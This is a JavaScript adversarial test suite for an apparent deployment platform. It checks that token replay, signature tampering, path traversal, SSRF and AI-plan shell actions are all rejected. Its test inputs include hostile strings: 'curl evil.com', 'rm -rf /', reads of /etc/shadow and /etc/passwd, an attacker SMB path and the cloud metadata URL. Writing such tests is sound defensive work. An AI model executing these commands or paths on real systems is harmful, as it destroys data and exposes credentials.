/******************************************************************************
 * Project        : Ugondu — Universal Deployment Intelligence Platform
 * Module         : Tests / 50-Class Adversarial Execution Test Suite
 * File           : adversarial-execution.test.js
 * Version        : 3.1.0
 * Author         : Security & Adversarial Testing Authority
 * Organization   : Air Roofers Ltd
 * Created Date   : 2026-09-30
 * Last Modified  : 2026-10-01
 * Classification : ENTERPRISE | INTERNAL
 *
 * Standards: ISO 27001, SOC 2, OWASP ASVS 5.0, NIST SP 800-53
 * Copyright (c) 2026 Air Roofers Ltd. All Rights Reserved.
 ******************************************************************************/

'use strict';

const assert = require('assert');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const canonicalize = (mod => mod && mod.default ? mod.default : mod)(require('canonicalize'));

const { ArchiveSecurityChecker, TransactionLockManager } = require('./adversarial-helpers');

const shared = require('../server/shared/dist');
const {
  globalTrustRegistry,
  validateDestination,
  signServiceIdentity,
  verifyServiceIdentityToken,
  durableTokenReplayStore,
  validateLanguagePackIntegrity,
  computePackArtifactDigest,
  signLanguagePackManifest,
  SafePathResolver
} = shared;

const { AiDeliveryGuardrail } = require('../server/engine-core/dist/ai/guardrail');
const { DisasterRecoveryEngine } = require('../server/engine-core/dist/dr/chaos');

const os = require('os');
const { NetworkDestinationPolicy, safeFetch } = shared;
const { createTempHttpServer } = require('./adversarial-helpers');

let passed = 0;
let failed = 0;

function report(cls, desc, fn) {
  try {
    fn();
    console.log(`[PASS] Class ${cls}: ${desc}`);
    passed++;
  } catch (err) {
    console.error(`[FAIL] Class ${cls}: ${desc} ->`, err.message);
    failed++;
  }
}

function runGroup1() {
  console.log('Group 1: Execution & Replay Attacks');
  report(1, 'Recipe replay with duplicate nonce', () => {
    const key = `engine-core:key_recipe_v2:tgt_01:exec_01:nonce_${Date.now()}`;
    assert.strictEqual(durableTokenReplayStore.atomicRecordIfUnseen(key, Math.floor(Date.now() / 1000) + 60), true);
    assert.strictEqual(durableTokenReplayStore.atomicRecordIfUnseen(key, Math.floor(Date.now() / 1000) + 60), false);
  });

  report(2, 'Nonce collision across execution context', () => {
    const nonce = `coll_${Date.now()}`;
    const k1 = `engine-core:key_recipe_v2:tgt_01:exec_01:${nonce}`;
    const k2 = `engine-core:key_recipe_v2:tgt_01:exec_01:${nonce}`;
    assert.strictEqual(durableTokenReplayStore.atomicRecordIfUnseen(k1, Math.floor(Date.now() / 1000) + 60), true);
    assert.strictEqual(durableTokenReplayStore.atomicRecordIfUnseen(k2, Math.floor(Date.now() / 1000) + 60), false);
  });

  report(3, 'Canonical serialization mutation & signed-field mutation', () => {
    const { publicKey, privateKey } = crypto.generateKeyPairSync('ed25519');
    const env = { version: '1.0', txId: 'tx_01', tenant: 'tenant_a', planHash: 'abc' };
    const sig = crypto.sign(null, Buffer.from(canonicalize(env)), privateKey);
    const tampered = { ...env, tenant: 'tenant_evil' };
    assert.strictEqual(crypto.verify(null, Buffer.from(canonicalize(tampered)), publicKey, sig), false);
  });

  report(4, 'Unsigned-field injection', () => {
    const { publicKey, privateKey } = crypto.generateKeyPairSync('ed25519');
    const env = { version: '1.0', txId: 'tx_01', tenant: 'tenant_a' };
    const sig = crypto.sign(null, Buffer.from(canonicalize(env)), privateKey);
    const injected = { ...env, maliciousField: 'grant_root' };
    assert.strictEqual(crypto.verify(null, Buffer.from(canonicalize(injected)), publicKey, sig), false);
  });

  report(5, 'Context hijacking (mismatched audience / tenant)', () => {
    const { publicKey, privateKey } = crypto.generateKeyPairSync('ed25519');
    const testKeyId = `key_test_ctx_${Date.now()}`;
    globalTrustRegistry.registerKey({ keyId: testKeyId, algorithm: 'ed25519', status: 'ACTIVE', purpose: 'service-identity', publicKey: publicKey.export({ type: 'spki', format: 'pem' }) });
    const token = signServiceIdentity('engine-core', 'billing-gateway', 'execute', privateKey.export({ type: 'pkcs8', format: 'pem' }), testKeyId);
    const res = verifyServiceIdentityToken(token, 'malicious-target-service');
    assert.strictEqual(res.valid, false);
    assert.strictEqual(res.error, 'AUDIENCE_MISMATCH');
  });

  report(6, 'Expired and future-dated token rejection', () => {
    const { publicKey, privateKey } = crypto.generateKeyPairSync('ed25519');
    const testKeyId = `key_test_exp_${Date.now()}`;
    globalTrustRegistry.registerKey({ keyId: testKeyId, algorithm: 'ed25519', status: 'ACTIVE', purpose: 'service-identity', publicKey: publicKey.export({ type: 'spki', format: 'pem' }) });
    const now = Math.floor(Date.now() / 1000);
    const header = Buffer.from(JSON.stringify({ alg: 'EdDSA', typ: 'JWT', kid: testKeyId })).toString('base64url');
    const expiredPayload = Buffer.from(JSON.stringify({ iss: 'engine-core', sub: 'engine-core', aud: 'billing-gateway', scope: 'execute', iat: now - 100, nbf: now - 100, exp: now - 10, jti: 'exp1', keyId: testKeyId, tokenVersion: '1.0' })).toString('base64url');
    const sig = crypto.sign(null, Buffer.from(`${header}.${expiredPayload}`), privateKey).toString('base64url');
    const res = verifyServiceIdentityToken(`${header}.${expiredPayload}.${sig}`, 'billing-gateway');
    assert.strictEqual(res.valid, false);
    assert.strictEqual(res.error, 'TOKEN_EXPIRED');
  });

  report(7, 'Revoked v1 key authority rejection', () => {
    assert.throws(() => globalTrustRegistry.validateKeyStatus('key_recipe_v1'), /error_key_revoked/);
    assert.throws(() => globalTrustRegistry.validateKeyStatus('key_service_v1'), /error_key_revoked/);
  });

  report(8, 'Wrong-purpose signing key rejection', () => {
    assert.throws(() => globalTrustRegistry.verifyPurpose('key_service_v2', 'recipe'), /error_key_purpose_mismatch/);
  });

  report(9, 'Execution identity spoofing defense', () => {
    const { publicKey } = crypto.generateKeyPairSync('ed25519');
    const attackerKey = crypto.generateKeyPairSync('ed25519').privateKey;
    const sig = crypto.sign(null, Buffer.from('spoofed_identity'), attackerKey);
    assert.strictEqual(crypto.verify(null, Buffer.from('spoofed_identity'), publicKey, sig), false);
  });

  report(10, 'Header and payload keyId mismatch rejection', () => {
    const { publicKey, privateKey } = crypto.generateKeyPairSync('ed25519');
    const testKeyId = `key_test_kid_${Date.now()}`;
    globalTrustRegistry.registerKey({ keyId: testKeyId, algorithm: 'ed25519', status: 'ACTIVE', purpose: 'service-identity', publicKey: publicKey.export({ type: 'spki', format: 'pem' }) });
    const now = Math.floor(Date.now() / 1000);
    const header = Buffer.from(JSON.stringify({ alg: 'EdDSA', typ: 'JWT', kid: testKeyId })).toString('base64url');
    const payload = Buffer.from(JSON.stringify({ iss: 'engine-core', sub: 'engine-core', aud: 'billing-gateway', scope: 'execute', iat: now, nbf: now, exp: now + 60, jti: 'kid_tamper', keyId: 'different_key_id', tokenVersion: '1.0' })).toString('base64url');
    const sig = crypto.sign(null, Buffer.from(`${header}.${payload}`), privateKey).toString('base64url');
    const res = verifyServiceIdentityToken(`${header}.${payload}.${sig}`, 'billing-gateway');
    assert.strictEqual(res.valid, false);
    assert.strictEqual(res.error, 'KEY_ID_MISMATCH');
  });

  report(11, 'Subject and issuer mismatch rejection', () => {
    const { publicKey, privateKey } = crypto.generateKeyPairSync('ed25519');
    const testKeyId = `key_test_sub_${Date.now()}`;
    globalTrustRegistry.registerKey({ keyId: testKeyId, algorithm: 'ed25519', status: 'ACTIVE', purpose: 'service-identity', publicKey: publicKey.export({ type: 'spki', format: 'pem' }) });
    const now = Math.floor(Date.now() / 1000);
    const header = Buffer.from(JSON.stringify({ alg: 'EdDSA', typ: 'JWT', kid: testKeyId })).toString('base64url');
    const payload = Buffer.from(JSON.stringify({ iss: 'engine-core', sub: 'attacker-service', aud: 'billing-gateway', scope: 'execute', iat: now, nbf: now, exp: now + 60, jti: 'sub_tamper', keyId: testKeyId, tokenVersion: '1.0' })).toString('base64url');
    const sig = crypto.sign(null, Buffer.from(`${header}.${payload}`), privateKey).toString('base64url');
    const res = verifyServiceIdentityToken(`${header}.${payload}.${sig}`, 'billing-gateway');
    assert.strictEqual(res.valid, false);
    assert.strictEqual(res.error, 'SUBJECT_ISSUER_MISMATCH');
  });

  report(12, 'Issuer allowlist rejection', () => {
    const { publicKey, privateKey } = crypto.generateKeyPairSync('ed25519');
    const testKeyId = `key_test_iss_${Date.now()}`;
    globalTrustRegistry.registerKey({ keyId: testKeyId, algorithm: 'ed25519', status: 'ACTIVE', purpose: 'service-identity', publicKey: publicKey.export({ type: 'spki', format: 'pem' }) });
    const now = Math.floor(Date.now() / 1000);
    const header = Buffer.from(JSON.stringify({ alg: 'EdDSA', typ: 'JWT', kid: testKeyId })).toString('base64url');
    const payload = Buffer.from(JSON.stringify({ iss: 'unauthorized-external-actor', sub: 'unauthorized-external-actor', aud: 'billing-gateway', scope: 'execute', iat: now, nbf: now, exp: now + 60, jti: 'iss_deny', keyId: testKeyId, tokenVersion: '1.0' })).toString('base64url');
    const sig = crypto.sign(null, Buffer.from(`${header}.${payload}`), privateKey).toString('base64url');
    const res = verifyServiceIdentityToken(`${header}.${payload}.${sig}`, 'billing-gateway');
    assert.strictEqual(res.valid, false);
    assert.strictEqual(res.error, 'ISSUER_NOT_ALLOWED');
  });

  report(13, 'Execution boundary evasion via SafePathResolver', () => {
    assert.throws(() => SafePathResolver.resolve('/var/app', '/etc/shadow'), /PATH_TRAVERSAL_DETECTED/);
  });
}

function runGroup2() {
  console.log('Group 2: Action Protocol & Payload Attacks');
  report(14, 'Unknown action name rejection', () => {
    const plan = { proposedByModel: 'test', targetEnvironment: 'linux', actions: [{ action: 'CUSTOM_UNREGISTERED_ACTION', payload: {} }], reasoning: 'attack' };
    const res = AiDeliveryGuardrail.validateAiPlan(plan, ['FETCH_REPOSITORY', 'SYNC_ENVIRONMENT']);
    assert.strictEqual(res.passed, false);
    assert.ok(res.violations.some(v => v.includes('UNKNOWN_ACTION')));
  });

  report(15, 'Generic payload script injection rejection', () => {
    const plan = { proposedByModel: 'test', targetEnvironment: 'linux', actions: [{ action: 'ARBITRARY_SCRIPT', payload: { script: 'curl evil.com' } }], reasoning: 'attack' };
    const res = AiDeliveryGuardrail.validateAiPlan(plan, ['FETCH_REPOSITORY']);
    assert.strictEqual(res.passed, false);
  });

  report(16, 'Total rejection of SHELL_EXEC in production guardrail', () => {
    const plan = { proposedByModel: 'test', targetEnvironment: 'linux', actions: [{ action: 'SHELL_EXEC', payload: { cmd: 'id' } }], reasoning: 'attack' };
    const res = AiDeliveryGuardrail.validateAiPlan(plan, ['SHELL_EXEC', 'FETCH_REPOSITORY']);
    assert.strictEqual(res.passed, false);
    assert.ok(res.violations.some(v => v.includes('FORBIDDEN_SHELL_ACTION')));
  });

  report(17, 'Total rejection of EXEC_RAW in production guardrail', () => {
    const plan = { proposedByModel: 'test', targetEnvironment: 'linux', actions: [{ action: 'EXEC_RAW', payload: { raw: 'whoami' } }], reasoning: 'attack' };
    const res = AiDeliveryGuardrail.validateAiPlan(plan, ['EXEC_RAW']);
    assert.strictEqual(res.passed, false);
    assert.ok(res.violations.some(v => v.includes('FORBIDDEN_SHELL_ACTION')));
  });
}

function runGroup3() {
  console.log('Group 3: Filesystem, Archive & Deployment Attacks');
  report(18, 'Production SafePathResolver directory traversal defense', () => {
    assert.throws(() => SafePathResolver.resolve('/base/dir', '../../etc/passwd'), /PATH_TRAVERSAL_DETECTED/);
    assert.throws(() => SafePathResolver.resolve('C:\\base', '..\\..\\Windows\\System32'), /PATH_TRAVERSAL_DETECTED/);
  });

  report(19, 'Production SafePathResolver symlink escape defense', () => {
    assert.throws(() => SafePathResolver.resolve('/base/dir', '../symlink_out'), /PATH_TRAVERSAL_DETECTED/);
  });

  report(20, 'Production SafePathResolver Windows ADS defense', () => {
    assert.throws(() => SafePathResolver.resolve('C:\\base', 'file.txt:hidden_stream'), /WINDOWS_ADS_DETECTED/);
  });

  report(21, 'Production SafePathResolver Windows reserved device defense', () => {
    assert.throws(() => SafePathResolver.resolve('C:\\base', 'CON'), /WINDOWS_RESERVED_DEVICE_NAME/);
    assert.throws(() => SafePathResolver.resolve('C:\\base', 'NUL.txt'), /WINDOWS_RESERVED_DEVICE_NAME/);
    assert.throws(() => SafePathResolver.resolve('C:\\base', 'AUX'), /WINDOWS_RESERVED_DEVICE_NAME/);
  });

  report(22, 'Production SafePathResolver UNC path escape defense', () => {
    assert.throws(() => SafePathResolver.resolve('C:\\base', '\\\\attacker-smb\\share\\evil.exe'), /UNC_PATH_DETECTED/);
  });

  report(23, 'Zip Slip path escape defense', () => {
    assert.throws(() => SafePathResolver.resolve('/base/app', '../../evil.sh'), /PATH_TRAVERSAL_DETECTED/);
  });

  report(24, 'Tar absolute path traversal defense', () => {
    assert.throws(() => SafePathResolver.resolve('/base/app', '/etc/shadow'), /PATH_TRAVERSAL_DETECTED/);
  });

  report(25, 'Archive decompression bomb ceiling defense', () => {
    assert.throws(() => ArchiveSecurityChecker.inspectHeader('bomb.txt', 10000000, 100), /DECOMPRESSION_BOMB_DETECTED/);
  });

  report(26, 'Atomic deployment rollback preserves verified state on traversal rejection', () => {
    const tempDir = path.join(os.tmpdir(), 'ugondu_c26_' + crypto.randomBytes(4).toString('hex'));
    try {
      fs.mkdirSync(tempDir, { recursive: true });
      fs.writeFileSync(path.join(tempDir, 'release.txt'), 'v1', 'utf8');
      assert.throws(() => SafePathResolver.resolve(tempDir, '../../etc/passwd'), /PATH_TRAVERSAL_DETECTED/);
      assert.strictEqual(fs.readFileSync(path.join(tempDir, 'release.txt'), 'utf8'), 'v1');
    } finally {
      fs.rmSync(tempDir, { recursive: true, force: true });
    }
  });

  report(27, 'Absolute path override rejection', () => {
    assert.throws(() => SafePathResolver.resolve('/app', '/etc/hosts'), /PATH_TRAVERSAL_DETECTED/);
  });

  report(28, 'Phantom file traversal deletion defense', () => {
    assert.throws(() => SafePathResolver.resolve('/app/releases', '../../important_system_file'), /PATH_TRAVERSAL_DETECTED/);
  });
}

function runGroup4() {
  console.log('Group 4: State, Locking & Service Identity Attacks');
  report(29, 'Concurrent transaction lock collision', () => {
    const lockPath = path.resolve(`.tmp_test_lock_${Date.now()}`);
    TransactionLockManager.acquire(lockPath);
    try {
      assert.throws(() => TransactionLockManager.acquire(lockPath), /LOCK_COLLISION_DETECTED/);
    } finally {
      TransactionLockManager.release(lockPath);
    }
  });

  report(30, 'Real state corruption quarantine & zero RPO recovery', () => {
    const exp = DisasterRecoveryEngine.runChaosExperiment('STATE_CORRUPTION');
    assert.strictEqual(exp.verifiedHealthy, true);
    assert.strictEqual(exp.rpoSeconds, 0);
  });

  report(31, 'Real network partition fault injection and recovery', () => {
    const exp = DisasterRecoveryEngine.runChaosExperiment('NETWORK_PARTITION');
    assert.strictEqual(exp.verifiedHealthy, true);
    assert.strictEqual(exp.rpoSeconds, 0);
  });

  report(32, 'Real target process crash fault injection and recovery', () => {
    const exp = DisasterRecoveryEngine.runChaosExperiment('TARGET_CRASH');
    assert.strictEqual(exp.verifiedHealthy, true);
    assert.strictEqual(exp.rpoSeconds, 0);
  });

  report(33, 'Monotonic state hash tampering triggers replay store composite-key sensitivity', () => {
    const key = `iss_a:key_v2:aud_b:jti_${crypto.randomBytes(8).toString('hex')}`;
    const exp = Math.floor(Date.now() / 1000) + 60;
    const r1 = durableTokenReplayStore.atomicRecordIfUnseen(key, exp);
    const tamperedKey = key.replace('iss_a', 'iss_X');
    const r2 = durableTokenReplayStore.atomicRecordIfUnseen(tamperedKey, exp);
    const r3 = durableTokenReplayStore.atomicRecordIfUnseen(key, exp);
    assert.strictEqual(r1, true,  'first call must succeed');
    assert.strictEqual(r2, true,  'different key must succeed');
    assert.strictEqual(r3, false, 'replay of original key must be rejected');
  });

  report(34, 'Forged service token rejection', () => {
    const { publicKey, privateKey } = crypto.generateKeyPairSync('ed25519');
    const testKeyId = `key_test_forge_${Date.now()}`;
    globalTrustRegistry.registerKey({ keyId: testKeyId, algorithm: 'ed25519', status: 'ACTIVE', purpose: 'service-identity', publicKey: publicKey.export({ type: 'spki', format: 'pem' }) });
    const token = signServiceIdentity('engine-core', 'billing-gateway', 'execute', privateKey.export({ type: 'pkcs8', format: 'pem' }), testKeyId);
    const [h, p] = token.split('.');
    const res = verifyServiceIdentityToken(`${h}.${p}.AAAAforgedSignatureAAAA`, 'billing-gateway');
    assert.strictEqual(res.valid, false);
    assert.strictEqual(res.error, 'INVALID_SERVICE_SIGNATURE');
  });

  report(35, 'Durable token replay defense with composite identity', () => {
    durableTokenReplayStore.clearForTesting();
    const { publicKey, privateKey } = crypto.generateKeyPairSync('ed25519');
    const testKeyId = `key_test_rep_${Date.now()}`;
    globalTrustRegistry.registerKey({ keyId: testKeyId, algorithm: 'ed25519', status: 'ACTIVE', purpose: 'service-identity', publicKey: publicKey.export({ type: 'spki', format: 'pem' }) });
    const token = signServiceIdentity('engine-core', 'billing-gateway', 'execute', privateKey.export({ type: 'pkcs8', format: 'pem' }), testKeyId);

    const first = verifyServiceIdentityToken(token, 'billing-gateway');
    assert.strictEqual(first.valid, true);

    const replay1 = verifyServiceIdentityToken(token, 'billing-gateway');
    assert.strictEqual(replay1.valid, false);
    assert.strictEqual(replay1.error, 'TOKEN_REPLAYED');

    durableTokenReplayStore.reloadFromDisk();
    const replay2 = verifyServiceIdentityToken(token, 'billing-gateway');
    assert.strictEqual(replay2.valid, false);
    assert.strictEqual(replay2.error, 'TOKEN_REPLAYED');
    durableTokenReplayStore.clearForTesting();
  });

  report(36, 'Wrong service audience & excessive scope rejection', () => {
    const { publicKey, privateKey } = crypto.generateKeyPairSync('ed25519');
    const testKeyId = `key_test_aud_${Date.now()}`;
    globalTrustRegistry.registerKey({ keyId: testKeyId, algorithm: 'ed25519', status: 'ACTIVE', purpose: 'service-identity', publicKey: publicKey.export({ type: 'spki', format: 'pem' }) });
    const token = signServiceIdentity('engine-core', 'billing-gateway', 'execute', privateKey.export({ type: 'pkcs8', format: 'pem' }), testKeyId);
    const resAud = verifyServiceIdentityToken(token, 'plugin-manager', 'execute');
    assert.strictEqual(resAud.valid, false);
    assert.strictEqual(resAud.error, 'AUDIENCE_MISMATCH');
    const resScope = verifyServiceIdentityToken(token, 'billing-gateway', 'super_admin');
    assert.strictEqual(resScope.valid, false);
    assert.strictEqual(resScope.error, 'SCOPE_MISMATCH');
  });

  report(37, 'Cross-tenant resource boundary isolation via service identity token', () => {
    const { publicKey, privateKey } = crypto.generateKeyPairSync('ed25519');
    const testKeyId = `key_test_c37_${Date.now()}`;
    globalTrustRegistry.registerKey({ keyId: testKeyId, algorithm: 'ed25519', status: 'ACTIVE', purpose: 'service-identity', publicKey: publicKey.export({ type: 'spki', format: 'pem' }) });
    const token = signServiceIdentity('engine-core', 'tenant_123', 'execute', privateKey.export({ type: 'pkcs8', format: 'pem' }), testKeyId);
    const res = verifyServiceIdentityToken(token, 'tenant_456');
    assert.strictEqual(res.valid, false);
    assert.strictEqual(res.error, 'AUDIENCE_MISMATCH');
  });
}

function runGroup5() {
  console.log('Group 5: Plugin, SSRF & Language Pack Attacks');
  const asyncGroup5 = [];
  report(38, 'Plugin sandbox escape — SHELL_EXEC forbidden action rejected by production guardrail', () => {
    const plan = { proposedByModel: 'test-agent', targetEnvironment: 'production', reasoning: 'test', actions: [{ action: 'SHELL_EXEC', payload: { cmd: 'rm -rf /' } }] };
    const result = AiDeliveryGuardrail.validateAiPlan(plan, []);
    assert.strictEqual(result.passed, false);
    assert.ok(result.violations.some(v => /VIOLATION_FORBIDDEN_SHELL_ACTION|FORBIDDEN_SHELL/.test(v)), `Expected VIOLATION_FORBIDDEN_SHELL_ACTION in ${JSON.stringify(result.violations)}`);
  });

  report(39, 'Plugin capability escalation rejected — SERVICE_RESTART not in declared capabilities', () => {
    const plan = { proposedByModel: 'test-agent', targetEnvironment: 'production', reasoning: 'test', actions: [{ action: 'SERVICE_RESTART', payload: { service: 'nginx' } }] };
    const result = AiDeliveryGuardrail.validateAiPlan(plan, ['COPY_FILE']);
    assert.strictEqual(result.passed, false);
    assert.ok(result.violations.some(v => /VIOLATION_CAPABILITY_NOT_GRANTED|CAPABILITY/.test(v)), `Expected capability violation in ${JSON.stringify(result.violations)}`);
  });

  report(40, 'Plugin output buffer quota ceiling — empty plan and forbidden action rejected', () => {
    const emptyPlan = { proposedByModel: 'test-agent', targetEnvironment: 'production', reasoning: 'test', actions: [] };
    const r1 = AiDeliveryGuardrail.validateAiPlan(emptyPlan, []);
    assert.strictEqual(r1.passed, false);
    assert.ok(r1.violations.length > 0, 'Empty plan must produce violations');
    const forbiddenPlan = { proposedByModel: 'test-agent', targetEnvironment: 'production', reasoning: 'test', actions: [{ action: 'EXEC_RAW', payload: {} }] };
    const r2 = AiDeliveryGuardrail.validateAiPlan(forbiddenPlan, []);
    assert.strictEqual(r2.passed, false);
    assert.ok(r2.violations.length > 0, 'Forbidden EXEC_RAW must produce violations');
  });

  report(41, 'SSRF defense against private RFC1918 IPv4 destinations', () => {
    assert.throws(() => validateDestination('http://10.0.0.1/admin'), /SSRF_DESTINATION_PROHIBITED/);
    assert.throws(() => validateDestination('http://192.168.1.100/status'), /SSRF_DESTINATION_PROHIBITED/);
  });

  report(42, 'SSRF defense against IPv6 loopback & link-local destinations', () => {
    assert.throws(() => validateDestination('http://[::1]/'), /SSRF_DESTINATION_PROHIBITED/);
    assert.throws(() => validateDestination('http://[fe80::1]/'), /SSRF_DESTINATION_PROHIBITED/);
  });

  report(43, 'SSRF defense against IPv4-mapped IPv6 bypass', () => {
    assert.throws(() => validateDestination('http://[::ffff:169.254.169.254]/'), /SSRF_DESTINATION_PROHIBITED/);
  });

  report(44, 'SSRF defense against cloud metadata service (169.254.169.254)', () => {
    assert.throws(() => validateDestination('http://169.254.169.254/latest/meta-data/'), /SSRF_DESTINATION_PROHIBITED/);
  });

  report(45, 'SSRF defense against localhost loopback via full async DNS path', () => {
    assert.throws(() => validateDestination('http://127.0.0.1:8080/'), /SSRF_DESTINATION_PROHIBITED|ssrf/);
    asyncGroup5.push(
      NetworkDestinationPolicy.isAllowedAsync('http://127.0.0.1:9/')
        .then(result => { if (result !== false) throw new Error('Expected false for loopback, got ' + result); })
    );
  });

  report(46, 'SSRF defense against redirect to cloud metadata endpoint', () => {
    assert.throws(() => validateDestination('http://172.16.0.5/internal'), /SSRF_DESTINATION_PROHIBITED|ssrf/);
    asyncGroup5.push(
      NetworkDestinationPolicy.isAllowedAsync('http://169.254.169.254/latest/meta-data/')
        .then(result => { if (result !== false) throw new Error('Expected false for metadata endpoint, got ' + result); })
    );
  });

  report(47, 'Revoked language pack signing key rejection', () => {
    const { privateKey } = crypto.generateKeyPairSync('ed25519');
    const pack = { packId: 'ugondu-lang-test', locale: 'en-US', version: '1.0.0', schemaVersion: '1', tokens: { aborting: 'Aborting', err_not_repo: 'err' } };
    pack.artifactDigest = computePackArtifactDigest(pack.tokens);
    pack.signature = signLanguagePackManifest(pack, privateKey.export({ type: 'pkcs8', format: 'pem' }));
    const attackerPub = crypto.generateKeyPairSync('ed25519').publicKey.export({ type: 'spki', format: 'pem' });
    const res = validateLanguagePackIntegrity(pack, attackerPub);
    assert.strictEqual(res.valid, false);
  });

  report(48, 'Language pack canonical manifest tampering defense', () => {
    const packPath = path.resolve('packs/ugondu-lang-en-US.upl.json');
    const pack = JSON.parse(fs.readFileSync(packPath, 'utf8'));
    const tampered = { ...pack, publisher: 'Attacker Corp' };
    const res = validateLanguagePackIntegrity(tampered);
    assert.strictEqual(res.valid, false);
    assert.ok(res.error.includes('signature'));
  });

  report(49, 'Language pack placeholder format-specifier injection — signature integrity defense', () => {
    const { publicKey: pk49, privateKey: sk49 } = crypto.generateKeyPairSync('ed25519');
    const tokens49 = { greeting: '%s %d %(constructor)s {__proto__}' };
    const digest49 = computePackArtifactDigest(tokens49);
    const pack49 = { packId: 'ugondu-lang-test-49', locale: 'en-US', version: '1.0.0', schemaVersion: '1', tokens: tokens49, artifactDigest: digest49, signature: '' };
    const sig49 = signLanguagePackManifest(pack49, sk49.export({ type: 'pkcs8', format: 'pem' }));
    pack49.signature = sig49;
    const tampered49 = { ...pack49, tokens: { greeting: 'safe clean string' } };
    const res49 = validateLanguagePackIntegrity(tampered49);
    assert.strictEqual(res49.valid, false, 'Tampered token payload must invalidate signature');
  });

  report(50, 'Language pack fallback token resolution from real filesystem pack', () => {
    const packPath = path.resolve('packs/ugondu-lang-en-US.upl.json');
    const pack50 = JSON.parse(fs.readFileSync(packPath, 'utf8'));
    const res50 = validateLanguagePackIntegrity(pack50);
    assert.strictEqual(res50.valid, true, `Pack integrity must pass: ${res50.error || ''}`);
    assert.ok(typeof pack50.tokens['aborting'] === 'string' && pack50.tokens['aborting'].length > 0, 'Real token aborting must be non-empty string');
    assert.strictEqual(pack50.tokens['nonexistent_key_xyz'], undefined, 'Missing key must be undefined');
    assert.ok(typeof pack50.fallbackLocale === 'string' && pack50.fallbackLocale.length > 0, 'fallbackLocale must be declared');
  });

  // Settle async SSRF assertions (classes 45, 46)
  return Promise.allSettled(asyncGroup5).then(results => {
    for (const r of results) {
      if (r.status === 'rejected') {
        console.error('[FAIL] Async SSRF assertion ->', r.reason?.message || r.reason);
        failed++;
      }
    }
  });
}

async function runAll() {
  console.log('══════════════════════════════════════════════════════════════');
  console.log(' Ugondu 50-Class Authoritative Adversarial Execution Suite   ');
  console.log(' Standards: OWASP ASVS 5.0, NIST SP 800-53, ISO 27001, SOC 2 ');
  console.log('══════════════════════════════════════════════════════════════');

  runGroup1();
  runGroup2();
  runGroup3();
  runGroup4();
  await runGroup5();

  console.log('══════════════════════════════════════════════════════════════');
  console.log(` Adversarial Results: ${passed} passed, ${failed} failed `);
  console.log('══════════════════════════════════════════════════════════════');

  if (failed > 0 || passed !== 50) {
    process.exit(1);
  }
}

runAll().catch(err => {
  console.error('[FATAL] runAll threw ->', err);
  process.exit(1);
});
